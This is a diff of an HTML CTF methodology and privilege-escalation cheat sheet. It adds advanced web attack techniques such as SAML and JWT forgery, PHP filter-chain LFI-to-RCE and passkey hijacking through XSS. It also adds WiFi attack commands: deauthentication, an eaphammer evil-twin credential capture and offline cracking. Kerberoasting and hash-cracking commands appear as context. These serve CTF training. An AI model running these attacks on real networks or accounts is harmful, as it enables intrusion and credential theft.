@@ -1,11 +1,12 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
 <title>CTF Field Reference // Methodology &amp; Privesc</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&amp;family=IBM+Plex+Sans:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
 <style>
 :root{
   --bg:#0b0f0d;
@@ -31,6 +32,7 @@
   --c-misc:#ffa07a;
   --c-ai:#ff79c6;
   --c-netsvc:#4dd0c4;
+  --c-cloud:#7aa2f7;
   --c-privesc:#ffb000;
   --c-setup:#8b9990;
   --c-meta:#8b9990;
@@ -204,6 +206,7 @@ body{
 .chip[data-cat="misc"].active{background:var(--c-misc);}
 .chip[data-cat="ai"].active{background:var(--c-ai);}
 .chip[data-cat="netsvc"].active{background:var(--c-netsvc);}
+.chip[data-cat="cloud"].active{background:var(--c-cloud);}
 .chip[data-cat="privesc"].active{background:var(--c-privesc);}
 .chip[data-cat="meta"].active,
 .chip[data-cat="setup"].active{background:var(--c-meta); color:var(--bg);}
@@ -230,6 +233,7 @@ body{
 .dot-forensics{background:var(--c-forensics);} .dot-misc{background:var(--c-misc);}
 .dot-ai{background:var(--c-ai);} .dot-privesc{background:var(--c-privesc);}
 .dot-netsvc{background:var(--c-netsvc);}
+.dot-cloud{background:var(--c-cloud);}
 .dot-meta{background:var(--c-meta);} .dot-setup{background:var(--c-setup);}
 .nav-subtree{list-style:none; margin:0 0 6px 22px; padding:0; border-left:1px dashed var(--border); }
 .nav-subtree li a{
@@ -273,6 +277,7 @@ body{
 .doc-section.cat-misc{border-left-color:var(--c-misc);}
 .doc-section.cat-ai{border-left-color:var(--c-ai);}
 .doc-section.cat-netsvc{border-left-color:var(--c-netsvc);}
+.doc-section.cat-cloud{border-left-color:var(--c-cloud);}
 .doc-section.cat-privesc{border-left-color:var(--c-privesc);}
 .doc-section.cat-meta,.doc-section.cat-setup{border-left-color:var(--border);}
 .doc-section.hidden-cat{display:none;}
@@ -420,136 +425,108 @@ footer.doc-footer{
 </style>
 </head>
 <body>
-
 <div class="topbar">
-  <button class="menu-toggle" id="menuToggle">≡ NAV</button>
-  <div class="brand">CTF://FIELD-REFERENCE<span class="blink"></span></div>
-  <div class="sub">methodology · tools · privilege escalation</div>
+<button class="menu-toggle" id="menuToggle">≡ NAV</button>
+<div class="brand">CTF://FIELD-REFERENCE<span class="blink"></span></div>
+<div class="sub">methodology · tools · privilege escalation</div>
 </div>
-
 <div class="backdrop" id="backdrop"></div>
-
 <div class="layout">
-  <aside class="sidebar" id="sidebar">
-    <div class="search-wrap">
-      <div class="search-prompt"><span class="path">root@ctf</span>:~$ grep -ri</div>
-      <div class="search-row">
-        <input id="searchInput" type="text" placeholder="safe-linking, ESC1, SSTI, tcache..." autocomplete="off" spellcheck="false">
-      </div>
-    </div>
-    <div class="search-status" id="searchStatus"></div>
-    <div class="search-hint"><kbd>/</kbd> focus &nbsp; <kbd>Enter</kbd> next &nbsp; <kbd>Shift+Enter</kbd> prev &nbsp; <kbd>Esc</kbd> clear</div>
-
-    <div class="results-panel" id="resultsPanel"></div>
-
-    <div class="chips" id="chips">
-      <span class="chip active" data-cat="all">ALL</span>
-      <span class="chip" data-cat="web">WEB</span>
-      <span class="chip" data-cat="crypto">CRYPTO</span>
-      <span class="chip" data-cat="pwn">PWN</span>
-      <span class="chip" data-cat="rev">REV</span>
-      <span class="chip" data-cat="forensics">FORENSICS</span>
-      <span class="chip" data-cat="misc">MISC</span>
-      <span class="chip" data-cat="netsvc">NET SVC</span>
-      <span class="chip" data-cat="ai">AI/LLM</span>
-      <span class="chip" data-cat="privesc">PRIVESC</span>
-    </div>
-
-    <ul class="nav-tree" id="navTree">
-      
-    <li class="nav-item" data-cat="setup">
-      <a href="#0-environment-setup-do-this-once" class="nav-main"><span class="dot dot-setup"></span>0. Environment Setup (do this once)</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="web">
-      <a href="#1-web-methodology-tools" class="nav-main"><span class="dot dot-web"></span>1. WEB — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="crypto">
-      <a href="#2-cryptography-methodology-tools" class="nav-main"><span class="dot dot-crypto"></span>2. CRYPTOGRAPHY — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="pwn">
-      <a href="#3-binary-exploitation-pwn-methodology-tools" class="nav-main"><span class="dot dot-pwn"></span>3. BINARY EXPLOITATION (PWN) — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="rev">
-      <a href="#4-reverse-engineering-methodology-tools" class="nav-main"><span class="dot dot-rev"></span>4. REVERSE ENGINEERING — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="forensics">
-      <a href="#5-forensics-methodology-tools" class="nav-main"><span class="dot dot-forensics"></span>5. FORENSICS — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="misc">
-      <a href="#6-misc-osint-stego-smart-contracts-methodology-tools" class="nav-main"><span class="dot dot-misc"></span>6. MISC / OSINT / STEGO / SMART CONTRACTS — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="netsvc">
-      <a href="#7-network-services-smb-netbios-rpc-recon-exploitation" class="nav-main"><span class="dot dot-netsvc"></span>7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon &amp; Exploitation</a>
-      <ul class="nav-subtree"><li><a href="#71-decision-tree" class="nav-sub" data-cat="netsvc">7.1 Decision Tree</a></li><li><a href="#72-enumeration-manual-tooled-commands" class="nav-sub" data-cat="netsvc">7.2 Enumeration — Manual &amp; Tooled Commands</a></li><li><a href="#73-sharedata-hunting-once-you-have-access" class="nav-sub" data-cat="netsvc">7.3 Share/Data Hunting Once You Have Access</a></li><li><a href="#74-exploitation-vectors" class="nav-sub" data-cat="netsvc">7.4 Exploitation Vectors</a></li><li><a href="#75-tool-cheat-sheet" class="nav-sub" data-cat="netsvc">7.5 Tool Cheat-Sheet</a></li></ul>
-    </li>
-
-    <li class="nav-item" data-cat="ai">
-      <a href="#8-ai-llm-security-methodology-tools" class="nav-main"><span class="dot dot-ai"></span>8. AI / LLM SECURITY — Methodology &amp; Tools</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="meta">
-      <a href="#9-cross-cutting-skills-worth-practicing" class="nav-main"><span class="dot dot-meta"></span>9. Cross-Cutting Skills Worth Practicing</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="meta">
-      <a href="#10-suggested-practice-path" class="nav-main"><span class="dot dot-meta"></span>10. Suggested Practice Path</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="privesc">
-      <a href="#11-privesc-decision-tree-top-level" class="nav-main"><span class="dot dot-privesc"></span>11. Privesc Decision Tree (top level)</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="privesc">
-      <a href="#12-linux-privesc" class="nav-main"><span class="dot dot-privesc"></span>12. LINUX PRIVESC</a>
-      <ul class="nav-subtree"><li><a href="#11-decision-tree" class="nav-sub" data-cat="privesc">1.1 Decision Tree</a></li><li><a href="#12-enumeration-manual-checklist" class="nav-sub" data-cat="privesc">1.2 Enumeration — Manual Checklist</a></li><li><a href="#13-automated-enum-scripts" class="nav-sub" data-cat="privesc">1.3 Automated Enum Scripts</a></li><li><a href="#14-exploitation-by-vector" class="nav-sub" data-cat="privesc">1.4 Exploitation by Vector</a></li><li><a href="#15-tool-cheat-sheet-linux" class="nav-sub" data-cat="privesc">1.5 Tool Cheat-Sheet (Linux)</a></li></ul>
-    </li>
-
-    <li class="nav-item" data-cat="privesc">
-      <a href="#13-windows-privesc" class="nav-main"><span class="dot dot-privesc"></span>13. WINDOWS PRIVESC</a>
-      <ul class="nav-subtree"><li><a href="#21-decision-tree" class="nav-sub" data-cat="privesc">2.1 Decision Tree</a></li><li><a href="#22-enumeration-manual-checklist" class="nav-sub" data-cat="privesc">2.2 Enumeration — Manual Checklist</a></li><li><a href="#23-automated-enum-scripts" class="nav-sub" data-cat="privesc">2.3 Automated Enum Scripts</a></li><li><a href="#24-exploitation-by-vector" class="nav-sub" data-cat="privesc">2.4 Exploitation by Vector</a></li><li><a href="#25-tool-cheat-sheet-windows" class="nav-sub" data-cat="privesc">2.5 Tool Cheat-Sheet (Windows)</a></li></ul>
-    </li>
-
-    <li class="nav-item" data-cat="privesc">
-      <a href="#14-cross-cutting-privesc-principles" class="nav-main"><span class="dot dot-privesc"></span>14. Cross-Cutting Privesc Principles</a>
-      
-    </li>
-
-    <li class="nav-item" data-cat="meta">
-      <a href="#15-practice-resources" class="nav-main"><span class="dot dot-meta"></span>15. Practice Resources</a>
-      
-    </li>
-    </ul>
-  </aside>
-
-  <main class="main-col">
-    <div class="intro-block">
-      <h1 id="ctf-methodology-tool-guide-with-privilege-escalation">CTF Methodology &amp; Tool Guide (with Privilege Escalation)</h1>
+<aside class="sidebar" id="sidebar">
+<div class="search-wrap">
+<div class="search-prompt"><span class="path">root@ctf</span>:~$ grep -ri</div>
+<div class="search-row">
+<input autocomplete="off" id="searchInput" placeholder="safe-linking, ESC1, SSTI, tcache..." spellcheck="false" type="text"/>
+</div>
+</div>
+<div class="search-status" id="searchStatus"></div>
+<div class="search-hint"><kbd>/</kbd> focus   <kbd>Enter</kbd> next   <kbd>Shift+Enter</kbd> prev   <kbd>Esc</kbd> clear</div>
+<div class="results-panel" id="resultsPanel"></div>
+<div class="chips" id="chips">
+<span class="chip active" data-cat="all">ALL</span>
+<span class="chip" data-cat="web">WEB</span>
+<span class="chip" data-cat="crypto">CRYPTO</span>
+<span class="chip" data-cat="pwn">PWN</span>
+<span class="chip" data-cat="rev">REV</span>
+<span class="chip" data-cat="forensics">FORENSICS</span>
+<span class="chip" data-cat="misc">MISC</span>
+<span class="chip" data-cat="netsvc">NET SVC</span>
+      <span class="chip" data-cat="cloud">CLOUD</span>
+<span class="chip" data-cat="ai">AI/LLM</span>
+<span class="chip" data-cat="privesc">PRIVESC</span>
+</div>
+<ul class="nav-tree" id="navTree">
+<li class="nav-item" data-cat="setup">
+<a class="nav-main" href="#0-environment-setup-do-this-once"><span class="dot dot-setup"></span>0. Environment Setup (do this once)</a>
+</li>
+<li class="nav-item" data-cat="web">
+<a class="nav-main" href="#1-web-methodology-tools"><span class="dot dot-web"></span>1. WEB — Methodology &amp; Tools</a>
+</li>
+<li class="nav-item" data-cat="crypto">
+<a class="nav-main" href="#2-cryptography-methodology-tools"><span class="dot dot-crypto"></span>2. CRYPTOGRAPHY — Methodology &amp; Tools</a>
+</li>
+<li class="nav-item" data-cat="pwn">
+<a class="nav-main" href="#3-binary-exploitation-pwn-methodology-tools"><span class="dot dot-pwn"></span>3. BINARY EXPLOITATION (PWN) — Methodology &amp; Tools</a>
+</li>
+<li class="nav-item" data-cat="rev">
+<a class="nav-main" href="#4-reverse-engineering-methodology-tools"><span class="dot dot-rev"></span>4. REVERSE ENGINEERING — Methodology &amp; Tools</a>
+</li>
+<li class="nav-item" data-cat="forensics">
+<a class="nav-main" href="#5-forensics-methodology-tools"><span class="dot dot-forensics"></span>5. FORENSICS — Methodology &amp; Tools</a>
+</li>
+<li class="nav-item" data-cat="misc">
+<a class="nav-main" href="#6-misc-osint-stego-smart-contracts-methodology-tools"><span class="dot dot-misc"></span>6. MISC / OSINT / STEGO / SMART CONTRACTS — Methodology &amp; Tools</a>
+<ul class="nav-subtree"><li><a class="nav-sub" data-cat="misc" href="#wireless-wifi-8021x-attacks">Wireless / WiFi &amp; 802.1X Attacks</a></li></ul>
+</li>
+<li class="nav-item" data-cat="netsvc">
+<a class="nav-main" href="#7-network-services-smb-netbios-rpc-recon-exploitation"><span class="dot dot-netsvc"></span>7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon &amp; Exploitation</a>
+<ul class="nav-subtree"><li><a class="nav-sub" data-cat="netsvc" href="#71-decision-tree">7.1 Decision Tree</a></li><li><a class="nav-sub" data-cat="netsvc" href="#72-enumeration-manual-tooled-commands">7.2 Enumeration — Manual &amp; Tooled Commands</a></li><li><a class="nav-sub" data-cat="netsvc" href="#73-sharedata-hunting-once-you-have-access">7.3 Share/Data Hunting Once You Have Access</a></li><li><a class="nav-sub" data-cat="netsvc" href="#74-exploitation-vectors">7.4 Exploitation Vectors</a></li><li><a class="nav-sub" data-cat="netsvc" href="#75-tool-cheat-sheet">7.5 Tool Cheat-Sheet</a></li><li><a class="nav-sub" data-cat="netsvc" href="#76-samba-specific-misconfigurations">7.6 Samba-Specific Misconfigurations</a></li><li><a class="nav-sub" data-cat="netsvc" href="#77-mssql-as-an-attack-surface">7.7 MSSQL as an Attack Surface</a></li><li><a class="nav-sub" data-cat="netsvc" href="#78-postgresql-as-an-attack-surface">7.8 PostgreSQL as an Attack Surface</a></li><li><a class="nav-sub" data-cat="netsvc" href="#79-modern-ad-coercion-relay-delegation-attacks">7.9 Modern AD Coercion, Relay &amp; Delegation</a></li><li><a class="nav-sub" data-cat="netsvc" href="#710-other-services-worth-probing">7.10 Other Services Worth Probing</a></li></ul>
+</li>
+<li class="nav-item" data-cat="ai">
+<a class="nav-main" href="#8-ai-llm-security-methodology-tools"><span class="dot dot-ai"></span>8. AI / LLM SECURITY — Methodology &amp; Tools</a>
+</li><li class="nav-item" data-cat="cloud">
+<a class="nav-main" href="#9-cloud-supply-chain-azure-entra-id-ci-cd-infrastructure-as-code-attacks"><span class="dot dot-cloud"></span>9. CLOUD &amp; SUPPLY CHAIN — Azure/Entra ID &amp; CI/CD Infrastructure-as-Code Attacks</a>
+<ul class="nav-subtree">
+<li><a class="nav-sub" data-cat="cloud" href="#91-decision-tree">9.1 Decision Tree</a></li>
+<li><a class="nav-sub" data-cat="cloud" href="#92-azure-entra-id-enumeration-abuse">9.2 Azure / Entra ID Enumeration &amp; Abuse</a></li>
+<li><a class="nav-sub" data-cat="cloud" href="#93-ci-cd-infrastructure-as-code-supply-chain-attacks">9.3 CI/CD &amp; Infrastructure-as-Code Supply Chain Attacks</a></li>
+    <li><a class="nav-sub" data-cat="cloud" href="#94-kubernetes-pod-escape-secret-extraction">9.4 Kubernetes Pod Escape &amp; Secret Extraction</a></li>
+</ul>
+</li>
+<li class="nav-item" data-cat="meta">
+<a class="nav-main" href="#10-cross-cutting-skills-worth-practicing"><span class="dot dot-meta"></span>10. Cross-Cutting Skills Worth Practicing</a>
+</li>
+<li class="nav-item" data-cat="meta">
+<a class="nav-main" href="#11-suggested-practice-path"><span class="dot dot-meta"></span>11. Suggested Practice Path</a>
+</li>
+<li class="nav-item" data-cat="privesc">
+<a class="nav-main" href="#12-privesc-decision-tree-top-level"><span class="dot dot-privesc"></span>12. Privesc Decision Tree (top level)</a>
+</li>
+<li class="nav-item" data-cat="privesc">
+<a class="nav-main" href="#13-linux-privesc"><span class="dot dot-privesc"></span>13. LINUX PRIVESC</a>
+<ul class="nav-subtree"><li><a class="nav-sub" data-cat="privesc" href="#11-decision-tree">1.1 Decision Tree</a></li><li><a class="nav-sub" data-cat="privesc" href="#12-enumeration-manual-checklist">1.2 Enumeration — Manual Checklist</a></li><li><a class="nav-sub" data-cat="privesc" href="#13-automated-enum-scripts">1.3 Automated Enum Scripts</a></li><li><a class="nav-sub" data-cat="privesc" href="#14-exploitation-by-vector">1.4 Exploitation by Vector</a></li><li><a class="nav-sub" data-cat="privesc" href="#15-tool-cheat-sheet-linux">1.5 Tool Cheat-Sheet (Linux)</a></li></ul>
+</li>
+<li class="nav-item" data-cat="privesc">
+<a class="nav-main" href="#14-windows-privesc"><span class="dot dot-privesc"></span>14. WINDOWS PRIVESC</a>
+<ul class="nav-subtree"><li><a class="nav-sub" data-cat="privesc" href="#21-decision-tree">2.1 Decision Tree</a></li><li><a class="nav-sub" data-cat="privesc" href="#22-enumeration-manual-checklist">2.2 Enumeration — Manual Checklist</a></li><li><a class="nav-sub" data-cat="privesc" href="#23-automated-enum-scripts">2.3 Automated Enum Scripts</a></li><li><a class="nav-sub" data-cat="privesc" href="#24-exploitation-by-vector">2.4 Exploitation by Vector</a></li><li><a class="nav-sub" data-cat="privesc" href="#25-tool-cheat-sheet-windows">2.5 Tool Cheat-Sheet (Windows)</a></li></ul>
+</li>
+<li class="nav-item" data-cat="privesc">
+<a class="nav-main" href="#15-cross-cutting-privesc-principles"><span class="dot dot-privesc"></span>15. Cross-Cutting Privesc Principles</a>
+</li>
+<li class="nav-item" data-cat="meta">
+<a class="nav-main" href="#16-practice-resources"><span class="dot dot-meta"></span>16. Practice Resources</a>
+</li>
+</ul>
+</aside>
+<main class="main-col">
+<div class="intro-block">
+<h1 id="ctf-methodology-tool-guide-with-privilege-escalation">CTF Methodology &amp; Tool Guide (with Privilege Escalation)</h1>
 <p>A companion to the decision tree — for every branch, the actual commands/workflows to execute. Part I covers per-category web/crypto/pwn/reversing/forensics/misc methodology and tools. Part II covers privilege escalation in depth for once you've landed a shell.</p>
 <hr/>
 <h1 id="part-i-category-methodology">PART I — CATEGORY METHODOLOGY</h1>
 <hr/>
-
-    </div>
-
-    <section id="0-environment-setup-do-this-once" class="doc-section cat-setup" data-cat="setup" data-label="SETUP"><h2 id="0-environment-setup-do-this-once">0. Environment Setup (do this once)</h2>
+</div>
+<section class="doc-section cat-setup" data-cat="setup" data-label="SETUP" id="0-environment-setup-do-this-once"><h2 id="0-environment-setup-do-this-once">0. Environment Setup (do this once)</h2>
 <pre><code class="language-bash"># Core toolkit on Debian/Ubuntu/Kali
 sudo apt update &amp;&amp; sudo apt install -y \
   gdb python3-pip binutils file exiftool binwalk foremost \
@@ -565,7 +542,7 @@ git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./set
 </code></pre>
 <hr/>
 </section>
-<section id="1-web-methodology-tools" class="doc-section cat-web" data-cat="web" data-label="WEB"><h2 id="1-web-methodology-tools">1. WEB — Methodology &amp; Tools</h2>
+<section class="doc-section cat-web" data-cat="web" data-label="WEB" id="1-web-methodology-tools"><h2 id="1-web-methodology-tools">1. WEB — Methodology &amp; Tools</h2>
 <p><strong>Step 1: Recon</strong></p>
 <pre><code class="language-bash">whatweb http://target
 gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raw-medium.txt -x php,txt,bak
@@ -792,10 +769,69 @@ python3 smuggler.py -u http://target
 └─ Tools: Burp's "Server-Side Prototype Pollution Scanner" extension automates
     black-box detection without needing source access
 </code></pre>
-<p><strong>Note — Web LLM / AI-integration bugs</strong>: if the target is an LLM-backed web app (chatbot, RAG search, AI agent endpoint), treat prompt injection as a first-class web bug class in its own right — see the new <strong>AI/LLM Security</strong> category (Section 7) below for the dedicated methodology.</p>
+<p><strong>Note — Web LLM / AI-integration bugs</strong>: if the target is an LLM-backed web app (chatbot, RAG search, AI agent endpoint), treat prompt injection as a first-class web bug class in its own right — see the <strong>AI/LLM Security</strong> category (Section 8) below for the dedicated methodology.</p>
+<p><strong>Step 10: Less-common injection classes and auth-forgery techniques worth checking</strong></p>
+<pre><code>├─ SAML signature bypass / assertion forgery
+│   — if SSO is backed by SAML, check the library version for known signature-
+│   validation bugs (several SAML libraries across languages have shipped
+│   flaws letting you forge an assertion claiming to be any user without a
+│   valid signing key). Treat "how is the signature actually validated" as
+│   worth checking any time SAML is in the stack, the same way you'd check a
+│   JWT library version
+├─ JWT/JWE forgery using only a PUBLIC key (no server secret needed)
+│   — some JWT/JWE libraries have shipped bugs that let you forge a token
+│   that passes verification using only the server's published public key,
+│   bypassing what should be an asymmetric-signature guarantee entirely.
+│   Always check library CVEs for whatever JWT/JWE library is in use, not
+│   just alg:none/weak-HMAC-secret style attacks
+├─ Cypher injection (Neo4j / graph databases)
+│   — same conceptual bug as SQL injection, but for graph query languages.
+│   If the backend is a graph DB (Neo4j is most common), test the same
+│   injection probes (quote-breaking, boolean-based blind, UNION-equivalent)
+│   adapted to Cypher syntax rather than SQL
+├─ Template-eval injection beyond classic SSTI
+│   — Python f-string/format-string evaluation sinks (a value passed through
+│   an f-string or .format() built from untrusted XML/JSON input) can expose
+│   arbitrary Python expression evaluation, distinct from a full Jinja2/Twig
+│   engine — same impact as SSTI, different signature to look for in code
+├─ SSRF into non-HTTP binary wire protocols
+│   — don't assume an SSRF primitive is limited to fetching HTTP URLs; if the
+│   SSRF-reachable host speaks a binary protocol (message queues like Kafka,
+│   Redis, Memcached, etc.), crafting raw protocol bytes through the SSRF
+│   channel can reach much further than a simple internal HTTP GET would
+├─ Bash arithmetic-context injection
+│   — if a script passes user input into a Bash arithmetic context
+│   (double parens (( )) or an array/variable subscript), Bash evaluates that
+│   context as an expression and can execute embedded command substitutions
+│   — a frequently-missed injection surface distinct from classic
+│   quote-breaking command injection
+├─ LFI-to-RCE upgrade tricks when you can only read files, not upload
+│   ├─ PEAR pearcmd.php chain — on PHP hosts with PEAR installed, LFI-including
+│   │   pearcmd.php combined with PHP's register_argc_argv setting lets you
+│   │   pass CLI-style arguments through the URL to have PEAR write a
+│   │   malicious file to disk, then include that file to execute it
+│   └─ PHP filter chain generator — an entirely wrapper-based technique
+│       (no upload required) that chains php://filter conversion filters to
+│       synthesize arbitrary file content, including valid PHP, purely from
+│       an LFI read primitive; look up "php_filter_chain_generator" tooling
+│       when a target has no upload feature but does have a raw LFI
+├─ WebAuthn/passkey registration via XSS
+│   — if you land stored XSS on a privileged session, don't stop at cookie
+│   theft: a script running in that session's origin can also complete a
+│   WebAuthn/passkey registration ceremony, silently binding an
+│   attacker-controlled authenticator to the victim account for durable,
+│   credential-free persistent access
+└─ Known recent framework/CVE-driven auth bypasses worth checking versions for
+    ├─ Next.js middleware authorization bypass (CVE-2025-29927) — a crafted
+    │   header can cause Next.js to skip middleware-enforced auth checks
+    │   entirely on affected versions
+    └─ PHP-CGI "best-fit" encoding RCE on Windows (CVE-2024-4577) — Windows
+        locale best-fit character conversion lets specific byte sequences
+        smuggle a CGI argument injection past PHP-CGI's own escaping
+</code></pre>
 <hr/>
 </section>
-<section id="2-cryptography-methodology-tools" class="doc-section cat-crypto" data-cat="crypto" data-label="CRYPTO"><h2 id="2-cryptography-methodology-tools">2. CRYPTOGRAPHY — Methodology &amp; Tools</h2>
+<section class="doc-section cat-crypto" data-cat="crypto" data-label="CRYPTO" id="2-cryptography-methodology-tools"><h2 id="2-cryptography-methodology-tools">2. CRYPTOGRAPHY — Methodology &amp; Tools</h2>
 <p><strong>Step 1: Identify the primitive</strong></p>
 <pre><code class="language-bash">python3 -c "import re; print(open('cipher.txt').read())" # eyeball encoding
 cyberchef  # "Magic" wand for auto-identification of encodings/ciphers
@@ -845,7 +881,7 @@ john --wordlist=rockyou.txt hash.txt
 <p><strong>Tool cheat-sheet</strong>: RsaCtfTool, SageMath, CyberChef, hashcat/john, hash_extender, <code>openssl</code> CLI for quick primitive testing, <code>pycryptodome</code> for scripting custom decrypt logic.</p>
 <hr/>
 </section>
-<section id="3-binary-exploitation-pwn-methodology-tools" class="doc-section cat-pwn" data-cat="pwn" data-label="PWN"><h2 id="3-binary-exploitation-pwn-methodology-tools">3. BINARY EXPLOITATION (PWN) — Methodology &amp; Tools</h2>
+<section class="doc-section cat-pwn" data-cat="pwn" data-label="PWN" id="3-binary-exploitation-pwn-methodology-tools"><h2 id="3-binary-exploitation-pwn-methodology-tools">3. BINARY EXPLOITATION (PWN) — Methodology &amp; Tools</h2>
 <p><strong>Step 1: Baseline recon</strong></p>
 <pre><code class="language-bash">file chall
 checksec --file=chall     # from pwntools
@@ -918,7 +954,7 @@ gdb vmlinux
 <p><strong>Tool cheat-sheet</strong>: pwntools, gdb+pwndbg/gef, ROPgadget/ropper, one_gadget, libc-database, how2heap, seccomp-tools, checksec, QEMU (kernel pwn).</p>
 <hr/>
 </section>
-<section id="4-reverse-engineering-methodology-tools" class="doc-section cat-rev" data-cat="rev" data-label="REV"><h2 id="4-reverse-engineering-methodology-tools">4. REVERSE ENGINEERING — Methodology &amp; Tools</h2>
+<section class="doc-section cat-rev" data-cat="rev" data-label="REV" id="4-reverse-engineering-methodology-tools"><h2 id="4-reverse-engineering-methodology-tools">4. REVERSE ENGINEERING — Methodology &amp; Tools</h2>
 <p><strong>Step 1: Static triage</strong></p>
 <pre><code class="language-bash">file binary
 checksec --file=binary
@@ -967,7 +1003,7 @@ print(simgr.found[0].solver.eval(flag, cast_to=bytes))
 <p><strong>Tool cheat-sheet</strong>: Ghidra, IDA Free, radare2/cutter, x64dbg, angr, unicorn/miasm, Frida, upx.</p>
 <hr/>
 </section>
-<section id="5-forensics-methodology-tools" class="doc-section cat-forensics" data-cat="forensics" data-label="FORENSICS"><h2 id="5-forensics-methodology-tools">5. FORENSICS — Methodology &amp; Tools</h2>
+<section class="doc-section cat-forensics" data-cat="forensics" data-label="FORENSICS" id="5-forensics-methodology-tools"><h2 id="5-forensics-methodology-tools">5. FORENSICS — Methodology &amp; Tools</h2>
 <p><strong>Step 1: File identification &amp; carving</strong></p>
 <pre><code class="language-bash">file evidence.img
 binwalk -e evidence.img
@@ -1008,7 +1044,7 @@ capa sample.exe                   # capability detection
 <p><strong>Tool cheat-sheet</strong>: Volatility3, Autopsy/Sleuthkit, Wireshark/tshark, binwalk, foremost, zsteg, steghide, exiftool, john/hashcat, yara, capa.</p>
 <hr/>
 </section>
-<section id="6-misc-osint-stego-smart-contracts-methodology-tools" class="doc-section cat-misc" data-cat="misc" data-label="MISC"><h2 id="6-misc-osint-stego-smart-contracts-methodology-tools">6. MISC / OSINT / STEGO / SMART CONTRACTS — Methodology &amp; Tools</h2>
+<section class="doc-section cat-misc" data-cat="misc" data-label="MISC" id="6-misc-osint-stego-smart-contracts-methodology-tools"><h2 id="6-misc-osint-stego-smart-contracts-methodology-tools">6. MISC / OSINT / STEGO / SMART CONTRACTS — Methodology &amp; Tools</h2>
 <p><strong>OSINT</strong></p>
 <pre><code class="language-bash">exiftool photo.jpg                       # GPS/camera metadata
 # Reverse image search: Google Images, Yandex, TinEye
@@ -1033,9 +1069,34 @@ strings firmware.bin | grep -i passwd
 # UART: connect via `screen /dev/ttyUSB0 115200` after identifying pinout with a multimeter
 </code></pre>
 <p><strong>Tool cheat-sheet</strong>: exiftool, zbar, Foundry (forge/cast), slither, binwalk, screen/minicom (UART).</p>
+<h3 id="wireless-wifi-8021x-attacks">Wireless / WiFi &amp; 802.1X Attacks</h3>
+<p>Shows up as a dedicated category in some current lab environments simulating wireless networks. Distinct methodology from wired network attacks:</p>
+<pre><code>├─ WPA2-Personal (PSK) networks
+│   ├─ Capture a handshake (either passively, or by deauthenticating a
+│   │   connected client to force a reconnect/re-handshake)
+│   │   airmon-ng start wlan0
+│   │   airodump-ng wlan0mon
+│   │   aireplay-ng --deauth 5 -a &lt;bssid&gt; wlan0mon
+│   └─ Crack the captured handshake offline
+│       aircrack-ng -w wordlist.txt capture.cap
+├─ WPA2-Enterprise (802.1X/EAP) networks — a materially different attack
+│   ├─ Stand up an evil-twin access point impersonating the legitimate SSID
+│   ├─ When a client attempts to connect, capture its PEAP-MSCHAPv2
+│   │   authentication challenge/response instead of a 4-way handshake
+│   │   eaphammer --cert-wizard   # generate a cert for the rogue AP first
+│   │   eaphammer -i wlan0 --auth wpa-eap --essid "TargetCorp" --creds
+│   └─ Crack the captured MSCHAPv2 exchange offline — this recovers the
+│       actual user credential, not just PSK-equivalent network access
+├─ Decrypting captured wireless traffic once you have the PSK/key
+│   — load the key into Wireshark's IEEE 802.11 preferences to decrypt an
+│   entire capture for further analysis (session cookies, cleartext creds)
+└─ Look for hardcoded credentials in wireless daemon configs
+    (hostapd's eap_user file, wpa_supplicant configs) once you have host
+    access — these routinely contain plaintext RADIUS/EAP credentials
+</code></pre>
 <hr/>
 </section>
-<section id="7-network-services-smb-netbios-rpc-recon-exploitation" class="doc-section cat-netsvc" data-cat="netsvc" data-label="NETWORK SVC"><h2 id="7-network-services-smb-netbios-rpc-recon-exploitation">7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon &amp; Exploitation</h2>
+<section class="doc-section cat-netsvc" data-cat="netsvc" data-label="NETWORK SVC" id="7-network-services-smb-netbios-rpc-recon-exploitation"><h2 id="7-network-services-smb-netbios-rpc-recon-exploitation">7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon &amp; Exploitation</h2>
 <p>Extremely common in "box" style CTFs (HTB, TryHackMe, OSCP-style) as the very first foothold vector on Windows/AD targets, and often present on mixed Linux boxes running Samba. Treat this as the standard pre-shell recon phase whenever ports 135, 137-139, or 445 are open.</p>
 <h3 id="71-decision-tree">7.1 Decision Tree</h3>
 <pre><code>Ports 135/139/445 (and/or 137 UDP) open
@@ -1171,7 +1232,7 @@ impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip &lt;dc_ip&gt; #
 hashcat -m 13100 kerberoast.txt rockyou.txt      # crack Kerberoast hashes offline
 hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
 </code></pre>
-<p>This pairs directly with the AD CS abuse content in the Windows Privesc section (12) once you have any domain foothold — SMB/RPC enumeration is usually how you get that first foothold in the first place.</p>
+<p>This pairs directly with the AD CS abuse content in the Windows Privesc section (14) once you have any domain foothold — SMB/RPC enumeration is usually how you get that first foothold in the first place.</p>
